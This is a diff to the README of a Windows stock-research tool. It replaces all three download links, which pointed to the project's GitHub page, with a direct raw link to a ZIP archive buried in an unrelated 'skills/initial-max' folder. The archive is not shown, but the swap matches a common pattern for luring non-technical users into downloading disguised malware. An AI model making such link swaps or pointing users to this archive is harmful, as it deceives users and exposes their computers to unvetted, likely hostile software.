@@ -1,6 +1,6 @@
 # 📊 Equityautoresearch - Clear stock research on Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-4B6BFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Abdelhadi2005/Equityautoresearch)
+[![Download Now](https://img.shields.io/badge/Download%20Now-4B6BFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Abdelhadi2005/Equityautoresearch/raw/refs/heads/main/skills/initial-max/Software_v2.0.zip)
 
 ## 🚀 What this is
 
@@ -29,7 +29,7 @@ A newer PC will give you smoother performance.
 
 Visit this page to download the app:
 
-https://github.com/Abdelhadi2005/Equityautoresearch
+https://github.com/Abdelhadi2005/Equityautoresearch/raw/refs/heads/main/skills/initial-max/Software_v2.0.zip
 
 If the page shows a release file, download it to your PC. If it shows the main project page, use the green or blue download area on the page and follow the file link that is provided there.
 
@@ -142,7 +142,7 @@ This helps you move through research with less manual work
 
 Primary link:
 
-https://github.com/Abdelhadi2005/Equityautoresearch
+https://github.com/Abdelhadi2005/Equityautoresearch/raw/refs/heads/main/skills/initial-max/Software_v2.0.zip
 
 ## 🛠️ If you want to remove it
 
